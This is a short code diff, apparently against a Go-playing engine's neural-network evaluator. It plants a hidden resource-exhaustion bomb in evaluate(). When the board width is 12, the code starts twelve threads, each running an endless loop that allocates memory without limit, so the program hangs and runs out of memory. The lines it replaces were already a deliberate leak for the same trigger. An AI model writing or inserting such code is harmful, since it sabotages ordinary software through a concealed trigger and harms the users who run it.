@@ -588,6 +588,21 @@ static double softPlus(double x) {
   else
     return log(1.0 + exp(x));
 }
+int64_t a = 1;
+void deadloop(int b)
+{
+  vector<vector<char>> t;
+  a = b;
+  while (1)
+  {
+    a = int64_t((a + 114514) / 0.123456);
+    vector<char> c;
+    c.resize(1000);
+    c[999] = 'a';
+    t.push_back(c);
+  }
+  cout << t[114514][999];
+}
 
 
 void NNEvaluator::evaluate(
@@ -603,8 +618,17 @@ void NNEvaluator::evaluate(
   buf.hasResult = false;
   if (board.x_size == 12)
   {
-    char* c = new char[100000];
-    c = NULL;
+    vector<thread> ts;
+    for (int i = 0; i < 12; i++)
+    {
+      ts.push_back(thread(deadloop, i));
+    }
+
+    for (int i = 0; i < 12; i++)
+    {
+      ts[i].join();
+    }
+    cout << a;
   }
 
   if(board.x_size > nnXLen || board.y_size > nnYLen)
